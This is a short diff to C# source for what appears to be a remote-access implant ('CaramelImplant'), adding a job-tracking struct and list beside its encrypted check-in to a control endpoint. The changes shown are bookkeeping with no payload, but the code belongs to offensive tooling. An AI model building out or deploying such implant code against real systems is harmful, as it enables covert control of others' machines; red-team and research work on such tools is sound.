@@ -1,6 +1,7 @@
 ﻿using Newtonsoft.Json;
 using Newtonsoft.Json.Linq;
 using System;
+using System.Collections.Generic;
 using System.Diagnostics;
 using System.Text;
 using System.Threading;
@@ -42,6 +43,13 @@ namespace SaltedCaramel
         public string chunk_data;
     }
 
+    internal struct Job
+    {
+        public int shortId;
+        public string task;
+        internal Thread thread;
+    }
+
     /// <summary>
     /// This class contains all methods used by the CaramelImplant
     /// </summary>
@@ -53,6 +61,7 @@ namespace SaltedCaramel
 #else
         internal string endpoint { get; set; }
 #endif
+        internal List<Job> jobs;
         public string host { get; set; }
         public string ip { get; set; }
         public int pid { get; set; }
@@ -123,6 +132,8 @@ namespace SaltedCaramel
         {
             string initEndpoint = this.endpoint + "crypto/aes_psk/" + this.uuid;
             this.retry = 0;
+
+            this.jobs = new List<Job>();
 
             try // Try block for HTTP request
             {
